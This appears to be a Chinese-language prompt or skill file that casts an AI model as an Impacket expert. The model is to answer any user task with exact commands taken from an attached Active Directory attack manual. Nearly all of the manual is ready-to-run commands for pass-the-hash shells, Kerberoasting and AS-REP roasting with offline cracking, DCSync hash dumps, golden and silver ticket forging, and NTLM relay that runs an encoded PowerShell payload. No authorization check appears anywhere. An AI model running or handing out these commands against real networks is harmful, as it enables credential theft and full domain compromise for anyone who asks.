---
name: impacket
description: Impacket — Windows/AD 渗透测试工具集
---

你是 impacket 专家，拥有下方完整参考手册。根据用户的具体任务，给出精确的命令、参数解释和执行建议。

用户任务：$ARGS

---

# Impacket — Windows/AD 渗透测试工具集

## 基本信息

| 项目 | 内容 |
|------|------|
| 安装方式 | pip 安装，直接调用 |
| 适用场景 | Active Directory 攻击、SMB/LDAP 操作、Kerberos 攻击、横向移动、凭据提取 |

---

## 工具总览

| 工具 | 功能 |
|------|------|
| `psexec.py` | 通过 SMB 执行命令（获取 SYSTEM Shell） |
| `smbexec.py` | SMB 服务执行命令（更隐蔽） |
| `wmiexec.py` | WMI 远程命令执行 |
| `atexec.py` | Task Scheduler 远程命令 |
| `dcomexec.py` | DCOM 远程命令执行 |
| `secretsdump.py` | 提取 NTLM Hash/Kerberos Ticket/LSA Secrets |
| `GetUserSPNs.py` | Kerberoasting |
| `GetNPUsers.py` | AS-REP Roasting |
| `ticketer.py` | 生成 Kerberos Ticket（黄金/白银票据） |
| `getPac.py` | 获取 PAC |
| `smbclient.py` | SMB 文件操作 |
| `rpcdump.py` | RPC 端点枚举 |
| `lookupsid.py` | SID 枚举用户 |
| `samrdump.py` | SAM 数据库枚举 |
| `ntlmrelayx.py` | NTLM 中继攻击 |
| `ldapdomaindump.py` | LDAP 域信息导出 |

---

## 典型使用场景

### 1. 远程命令执行（PTH 传递哈希）

```bash
# psexec - 获取 SYSTEM Shell（最常用）
python3 -m impacket.examples.psexec domain/user@target -hashes :NTLMhash

# psexec - 明文密码
python3 -m impacket.examples.psexec domain/user:password@target

# smbexec - 更隐蔽（不上传服务）
python3 -m impacket.examples.smbexec domain/user@target -hashes :NTLMhash

# wmiexec - 不创建服务，更隐蔽
python3 -m impacket.examples.wmiexec domain/user:password@target
python3 -m impacket.examples.wmiexec domain/user@target -hashes :NTLMhash

# 执行单条命令（非交互）
python3 -m impacket.examples.wmiexec domain/user:pass@target -execute "whoami"
```

### 2. Kerberoasting（提取服务账号票据）

```bash
# 枚举 SPN 并请求票据
python3 -m impacket.examples.GetUserSPNs \
    domain.local/user:password \
    -dc-ip DC_IP \
    -request \
    -outputfile kerberoast_hashes.txt

# 离线破解
hashcat -m 13100 kerberoast_hashes.txt /opt/wordlists/rockyou.txt
john --wordlist=/opt/wordlists/rockyou.txt kerberoast_hashes.txt
```

### 3. AS-REP Roasting（不需要 Kerberos 预认证的用户）

```bash
# 无需凭据（针对 AS-REP Roasting 用户）
python3 -m impacket.examples.GetNPUsers \
    domain.local/ \
    -usersfile users.txt \
    -dc-ip DC_IP \
    -format hashcat \
    -outputfile asrep_hashes.txt

# 已知凭据时枚举所有 AS-REP Roasting 用户
python3 -m impacket.examples.GetNPUsers \
    domain.local/user:password \
    -dc-ip DC_IP \
    -request \
    -format hashcat

# 离线破解
hashcat -m 18200 asrep_hashes.txt /opt/wordlists/rockyou.txt
```

### 4. DCSync（提取域内所有哈希）

```bash
# 需要 Domain Admin 或 DCSync 权限
python3 -m impacket.examples.secretsdump \
    domain.local/administrator:password@DC_IP

# PTH 方式
python3 -m impacket.examples.secretsdump \
    domain.local/administrator@DC_IP \
    -hashes :NTLMhash

# 只提取指定用户
python3 -m impacket.examples.secretsdump \
    domain.local/admin:pass@DC_IP \
    -just-dc-user krbtgt
```

### 5. 本地 Hash 提取（SAM/LSA）

```bash
# 从本地机器提取（需要管理员权限）
python3 -m impacket.examples.secretsdump \
    -sam sam.save \
    -system system.save \
    -security security.save \
    LOCAL

# 从远程提取 SAM（执行时自动获取）
python3 -m impacket.examples.secretsdump \
    domain/admin:pass@target
```

### 6. 黄金票据（Golden Ticket）

```bash
# 需要：krbtgt 哈希、域 SID
# 先获取 krbtgt hash（通过 DCSync）
python3 -m impacket.examples.secretsdump domain/admin:pass@DC -just-dc-user krbtgt

# 生成黄金票据
python3 -m impacket.examples.ticketer \
    -nthash KRBTGT_NTLM_HASH \
    -domain-sid S-1-5-21-xxx-xxx-xxx \
    -domain domain.local \
    administrator

# 使用票据（设置环境变量）
export KRB5CCNAME=administrator.ccache
python3 -m impacket.examples.psexec domain.local/administrator@DC_IP -k -no-pass
```

### 7. 白银票据（Silver Ticket）

```bash
# 需要：服务账号哈希、域 SID、SPN
python3 -m impacket.examples.ticketer \
    -nthash SERVICE_NTLM_HASH \
    -domain-sid S-1-5-21-xxx-xxx-xxx \
    -domain domain.local \
    -spn cifs/target.domain.local \
    administrator
```

### 8. SMB 文件操作

```bash
# 列举共享
python3 -m impacket.examples.smbclient \
    //target/share \
    -U "domain/user%password"

# 列举所有共享
python3 -m impacket.examples.smbclient \
    //target/C$ \
    -U "domain/user%password" \
    -c "ls"
```

### 9. NTLM 中继攻击

```bash
# 配合 Responder 使用
# 第一步：关闭 Responder 的 SMB/HTTP
python3 /opt/tools/responder/Responder.py -I eth0 -wd

# 第二步：启动 ntlmrelayx
python3 -m impacket.examples.ntlmrelayx \
    -tf targets.txt \
    -smb2support \
    -l /tmp/relay_output

# 带命令执行
python3 -m impacket.examples.ntlmrelayx \
    -tf targets.txt \
    -smb2support \
    -c "powershell -enc BASE64_PAYLOAD"
```

### 10. 域用户枚举

```bash
# 通过 SID 枚举
python3 -m impacket.examples.lookupsid \
    domain/user:pass@DC_IP

# SAM 枚举
python3 -m impacket.examples.samrdump \
    domain/user:pass@target
```

### 11. RPC 枚举

```bash
python3 -m impacket.examples.rpcdump \
    -p 445 target.com
```

---

## PTH（Pass-The-Hash）快速参考

```bash
# 格式：-hashes LMhash:NThash
# 如果没有 LM hash 用空或32个0
-hashes :NTLMhash
-hashes 00000000000000000000000000000000:NTLMhash

# 常见 PTH 命令
python3 -m impacket.examples.psexec   corp/admin@10.10.10.1 -hashes :aad3b...
python3 -m impacket.examples.wmiexec  corp/admin@10.10.10.1 -hashes :aad3b...
python3 -m impacket.examples.smbexec  corp/admin@10.10.10.1 -hashes :aad3b...
python3 -m impacket.examples.secretsdump corp/admin@10.10.10.1 -hashes :aad3b...
```

---

## 常见错误处理

```bash
# 错误：STATUS_ACCESS_DENIED
# → 检查用户权限，尝试其他工具

# 错误：Kerberos SessionError: KRB_AP_ERR_SKEW
# → 时间同步问题
ntpdate DC_IP

# 错误：SMB1/SMB2 问题
# → 添加 -smb2support 参数

# 错误：Connection refused
# → 检查端口 445/135 是否开放
nmap -p 445,135 target
```
